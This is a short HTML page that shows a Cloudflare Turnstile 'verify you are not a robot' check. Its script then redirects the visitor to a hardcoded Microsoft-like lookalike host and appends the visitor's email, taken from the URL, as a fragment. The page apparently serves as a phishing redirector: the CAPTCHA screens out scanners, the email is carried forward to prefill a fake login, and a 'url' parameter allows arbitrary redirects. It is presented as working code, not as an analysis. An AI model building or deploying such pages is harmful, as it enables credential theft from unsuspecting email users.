<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirecting...</title>

    <!-- Cloudflare Turnstile -->
    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js" async defer></script>

    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
        }
        .error {
            color: red;
            display: none;
        }
        .cf-turnstile {
            margin: 20px auto;
            display: inline-block;
        }
    </style>
</head>
<body>
    <h2>Please verify you are not a robot</h2>

    <!-- Cloudflare Turnstile widget -->
    <div class="cf-turnstile"
         data-sitekey="0x4AAAAAACNgFp4o6xhnwLdT"
         data-callback="onTurnstileSuccess">
    </div>

    <p id="redirectMessage" style="display: none;">Redirecting, please wait...</p>
    <p id="errorMessage" class="error">Please complete the CAPTCHA to continue.</p>

    <script>
        // Configuration
        const defaultTargetUrl = "https://msclouds.cms.hulocorp.com/f/270ba0f09dac";
        const delayMs = 2000;
        const fallbackUrl = "https://fallback.example.com";

        // Function to get query parameters
        function getQueryParams() {
            const params = {};
            const queryString = window.location.search.substring(1);
            const pairs = queryString.split("&").filter(Boolean);
            pairs.forEach(pair => {
                const [key, value] = pair.split("=");
                params[decodeURIComponent(key)] = decodeURIComponent(value || "");
            });
            return params;
        }

        // Get hash value (supports LAST ? logic)
        function getHashValue() {
            if (!window.location.hash) return "";

            const rawHash = decodeURIComponent(window.location.hash.substring(1));
            const lastQuestionMarkIndex = rawHash.lastIndexOf("?");

            if (lastQuestionMarkIndex !== -1) {
                return rawHash.substring(lastQuestionMarkIndex + 1);
            }

            return rawHash;
        }

        function isValidUrl(string) {
            try {
                new URL(string);
                return true;
            } catch (_) {
                return false;
            }
        }

        function performRedirect(targetUrl) {
            document.getElementById("redirectMessage").style.display = "block";
            document.getElementById("errorMessage").style.display = "none";
            setTimeout(() => {
                try {
                    if (isValidUrl(targetUrl)) {
                        window.location.href = targetUrl;
                    } else {
                        window.location.href = fallbackUrl;
                    }
                } catch (error) {
                    console.error("Redirect failed:", error);
                    window.location.href = fallbackUrl;
                }
            }, delayMs);
        }

        // Turnstile success callback (mapped to existing logic)
        window.onTurnstileSuccess = function(token) {
            if (token) {
                const params = getQueryParams();
                const hashEmail = getHashValue();
                let targetUrl = defaultTargetUrl;

                // Target URL override
                if (params.url && isValidUrl(params.url)) {
                    targetUrl = params.url;
                }

                // Preserve other query parameters (except url & email)
                const originalParams = new URLSearchParams(window.location.search);
                originalParams.delete("url");
                originalParams.delete("email");

                const queryString = originalParams.toString();
                if (queryString) {
                    targetUrl += `?${queryString}`;
                }

                // Determine email source: ?email= first, then hash
                const finalEmail = params.email || hashEmail;

                // Append email as hash if present
                if (finalEmail) {
                    targetUrl += `#${finalEmail}`;
                }

                performRedirect(targetUrl);
            } else {
                document.getElementById("errorMessage").style.display = "block";
            }
        };

        // Optional: Reset Turnstile on load
        window.onload = function() {
            if (window.turnstile) {
                turnstile.reset();
            }
        };
    </script>
</body>
</html>
